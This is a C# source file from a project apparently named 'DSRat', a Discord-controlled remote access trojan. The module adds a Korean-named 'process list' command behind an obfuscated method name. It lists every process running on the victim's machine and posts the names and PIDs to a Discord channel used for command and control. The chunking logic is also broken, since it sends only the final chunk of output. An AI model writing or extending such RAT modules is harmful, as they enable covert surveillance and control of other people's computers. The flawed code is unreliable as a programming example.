using Discord.Commands;
using System;
using System.Collections.Generic;
using System.Diagnostics;
using System.Linq;
using System.Text;
using System.Threading.Tasks;

namespace DSRat
{
    public class processlist : ModuleBase<SocketCommandContext>
    {
        [Command("프로세스목록")]
        
        public async Task sanjfnsajfnlANGUEOWNFLDnslvn92835728935uNDDVNSKJ()
        {
            try
            {
                string[] list = new string[100000];
                int i = 0;
                int j = 0;
                string[] send = new string[1000];
                Process[] allProc = Process.GetProcesses();
                await Context.Channel.SendMessageAsync("--------프로세스-------- (NAME : PID)");
                foreach (Process p in allProc)
                {
                    list[i] = p.ProcessName + " : " + p.Id + "\n";
                    send[j] += list[i];
                    if(send[j].Length > 2000)
                    {
                        j++;
                    }
                    i++;
                }
                await Context.Channel.SendMessageAsync(send[j]);

            }
            catch (Exception e)
            {
                await Context.Channel.SendMessageAsync(e.Message);
            }
        }
    }
}
